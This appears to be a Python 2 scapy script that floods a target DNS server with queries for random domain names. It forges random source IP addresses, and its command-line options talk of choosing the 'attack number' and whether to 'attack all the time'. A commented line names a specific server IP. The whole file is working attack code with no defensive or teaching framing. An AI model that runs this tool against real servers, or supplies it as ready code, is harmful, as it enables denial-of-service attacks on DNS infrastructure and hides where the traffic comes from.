#!/usr/bin/python
from scapy.all import IP, UDP, DNS, DNSQR, send, conf, L3RawSocket, fuzz, RandShort
from random import randint
from optparse import OptionParser
import string
#zonelist = ['hthowh.7s.','j1.4.','c.qo1zfg.','zalzt.n.','ud9.','u9w.','l8.','4z.brsmt.','bodpg.','7upnq.hs0']
#server = ['202.173.9.227']
#multi_zone_str = hthowh.7s.,j1.4.,c.qo1zfg.,zalzt.n.,ud9.,u9w.,l8.,4z.brsmt.,bodpg.,7upnq.hs0
def _rand_num_by_ratio(low, high, scope = 6, ratio = 0.9):
     val = randint(low, high)
     if (val < high * ratio):
         val %= scope
         val += 1 # val can not be 0
     else:
         newRan = randint(1 , high + 1)
         val = val % newRan
         if (val <= scope):
             val += (scope + 1)
     return val
 
def gen_rand_prefix_domain(prefix_len = 253):
     namestr = string.digits
     namestr += string.lowercase
     #namestr += '-'
     strLen = _rand_num_by_ratio(1, prefix_len, 10)
     domain = ''
     label_len = _rand_num_by_ratio(1, 63)
     count = 0
     for j in range(0, strLen):
         if (len(domain) >= prefix_len - 1):
             break
         domain += namestr[randint(0, len(namestr) - 1)]
         count += 1
         if (count == label_len):
             domain += '.'
             label_len = _rand_num_by_ratio(1, 63)
             count = 0
     if (domain[len(domain) - 1] != '.'):
         domain += "."
     return domain


def gen_rand_domain(zonename):
    domain = gen_rand_prefix_domain(100)
    domain += zonename
    return domain
def gen_rand_domainlist(num, zonename):
    domainlist = []
    for i in xrange(num):
        domainlist.append(zonename) 
    return domainlist
def gen_rand_ip(num, prefix):
    v = prefix.split(".")
    v = [r for r in v if r != ''] 
    r_prefix = ".".join(v)
    print ">>>>>", len(v)
    li = _gen_ip_list(r_prefix, 4-len(v), num)
    return li
def _gen_ip_list(prefix, suffix_num, count):
    li = []
    for i in range(0, count):
        ip = prefix
        for i in range(0, 4):
            if suffix_num == 0: break
            if ip != '': ip += "."
            ip += str(randint(0, 255))
            if suffix_num == 1: break
            ip += "."
            ip += str(randint(0, 255))
            if suffix_num == 2: break
            ip += "."
            ip += str(randint(0, 255))
            if suffix_num == 3: break
            ip += "."
            ip += str(randint(0, 255))
            if suffix_num == 4: break
        li.append(ip)
    return li
    
def get_zonelist(input_str, r_zone_num):
    if input_str == 'random':
        zonelist = [gen_rand_prefix_domain(20) for i in range(r_zone_num)]
    else:
        zonelist = input_str.split(',')
    return zonelist
def getopt():
    parser = OptionParser()
    parser.add_option("-s", "--server", dest = 'server', default = '127.0.0.1',\
        help = 'specify the dns server ip address')
    parser.add_option("-p", "--port", dest = 'port', default = 53, type = int,\
        help = 'specify the dns server port')
    parser.add_option("-a", "--alltime", dest ='alltime', default = 'no',\
        help = 'specify whether attack all the time or not')
    parser.add_option("-n", "--num", dest = 'num', default = 1, type = int,\
        help = 'specify source ip number')
    parser.add_option("-m", "--num-per-zone", dest = 'npz', default = 1, type = int,\
        help = 'specify the attack number')
    parser.add_option("-k", "--zonenum", dest = 'zonenum', default = 1, type = int,\
        help = 'specify random zone number')
    parser.add_option("-f", "--prefix", dest = 'prefix', default= '',\
        help = 'specify source ip prefix such as 203.119')
    parser.add_option("-z", "--zone", dest = 'zone', default = 'random',\
        help = 'specify the zone that you known, can be z1,z2, default value is random that mean gen random zone')
    opts, args = parser.parse_args()
    return opts
def main(opts):
    if opts['server'] == '127.0.0.1':
        conf.L3socket = L3RawSocket
    if opts['zone'] == 'random':
        zonelist = get_zonelist('random', opts['zonenum'])
    else:
        zonelist = get_zonelist(opts['zone'], 1)

    port = opts['port']
    server = opts['server']
    print opts
    while True:
        src_ip = gen_rand_ip(opts['num'], opts['prefix']) 
        print src_ip
        domainlist = []
        for zone in zonelist:
            domainlist += gen_rand_domainlist(opts['npz'], zone)

        send(IP(dst = server, src=src_ip)/UDP(sport = RandShort(), dport = port)/DNS(id=RandShort(),qr = 0, qd = DNSQR(qname=domainlist)))
        if opts['alltime'] == 'no':
            break
     
if __name__ == "__main__":
    opts = getopt() 
    main(vars(opts))
    #print gen_rand_ip(10, "203.119.80")

